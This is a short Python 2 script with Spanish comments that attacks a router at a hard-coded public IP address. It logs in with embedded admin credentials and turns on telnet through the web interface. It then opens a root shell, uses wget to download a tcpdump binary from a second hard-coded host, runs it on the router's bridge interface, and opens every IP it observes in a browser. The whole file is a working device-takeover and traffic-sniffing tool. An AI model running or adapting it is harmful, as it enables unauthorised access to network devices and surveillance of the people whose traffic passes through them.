import mechanize
import telnetlib
import re
import os

buscaips = re.compile("\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}")

ip = "201.253.157.47"
miip = "181.110.0.187"


b = mechanize.Browser()
b.set_handle_robots(False)
b.addheaders = [('User-agent', 'Mozilla/4.0 (compatible; MSIE 5.0; Windows 98;)')]

def hastaAndar(direccion, ip):
    # el router suele tener un error y dice 400 bad request, asi que se reintenta
    r = b.open("http://" + ip + "/" + direccion)
    while "400 Bad Request" in r:
        print "mala respuesta"
        r = b.open("http://" + ip + "/" + direccion)

hastaAndar("login.html", ip)
hastaAndar("login.cgi?username=admin&psd=CalVxePV1!", ip)
hastaAndar("scsrvcntr.cmd?servicelist=HTTP=1,1,80;TELNET=1,1,23;FTP=0,0,21;TFTP=1,0,69;ICMP=1,0,0;SNMP=1,0,161;SAMBA=1,0,445;", ip)
hastaAndar("logout.cgi", ip)
        
# ahora ya tiene habilitado telnet, y como marca tiene deshabilitado el ftp local



user = "admin"
password = "CalVxePV1!"

tn = telnetlib.Telnet(ip)

tn.read_until("Login: ")
tn.write(user + "\n")
tn.read_until("Password: ")
tn.write(password + "\n")


tn.write("sh\n")
tn.read_until("#")
tn.write("cd /tmp/\n")
tn.read_until("#")
tn.write("ls\n")
if "tcpdump" not in tn.read_until("#"):
    tn.write("wget http://%s/tcpdump\n" % miip)
    tn.read_until("#")
tn.write("chmod +x tcpdump\n")
tn.read_until("#")
tn.write("./tcpdump -i br0\n")

abiertas = set()

while True:
    try:
        datos = tn.read_until("#",1)
        print datos
        for pagina in buscaips.findall(datos):
            if pagina not in abiertas:
                abiertas.add(pagina)
                os.system("/home/pablo/firefox/firefox 'http://%s'" % pagina)
    except KeyboardInterrupt:
        tn.write("\x03")
        tn.write("\x04")
        tn.write("\x04")
        tn.write("\x04")
        print tn.read_all()




